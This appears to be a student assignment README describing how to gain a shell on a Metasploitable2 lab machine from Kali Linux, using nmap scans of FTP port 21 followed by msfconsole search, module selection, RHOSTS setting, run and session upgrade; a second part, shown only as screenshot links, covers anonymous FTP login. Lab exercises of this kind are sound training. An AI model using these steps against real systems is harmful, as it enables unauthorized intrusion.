
# Assignment 1(16-09-2024)


## How to Connect Two Systems Using MSFConsole

This assignment is about how to connect two systems (computers or virtual machines) using MSFConsole, which is a tool in the Metasploit Framework.
## In this assignment, we connect kali linux with Metasploitable2

#### How to connect 
step 1
- start mataslpoitable2 find its ip command using 'ifconfig' and and ping with linux machine using command


```bash
ping 'metasloitable2 ip'
```

step 2
- start nmap and scan 'metasloitable2 ip' using
```bash
nmap -p 21 192.168.241.129
```


step 3
- scan for version of port
```bash
map -p 21 'metasloitable2 ip' -sV
```


step 4 
- open new tab of terminal and type command
```bash
msfconsole
```


step 5 
- search for that version
```bash
search 'version'
```


step 6 
```bash
use 0
```


step 7 
```bash
options
```


step 8 
```bash
set RHOSTS 'metasloitable2 ip'
```


step 9 
```bash
run
```


step 10 
```bash
sessions
```


step 11
- upgrading the session
```bash
sessions -u 1
```


step 12
```bash
sessions
```


step 13 
- select session id 2
```bash
sessions 2
```


now we gain access of metasploitable2 system
## 2nd part

find Host IPs and open Ports to login anonymously

![Screenshot_151](https://github.com/user-attachments/assets/09f51e5b-4c85-4d50-8fe7-939974c582a1)


![Screenshot_152](https://github.com/user-attachments/assets/e69649ea-4d27-4c64-862b-a924fea7b539)


![Screenshot_153](https://github.com/user-attachments/assets/71aa7b22-1b45-4805-92f5-a2dccb4b182b)


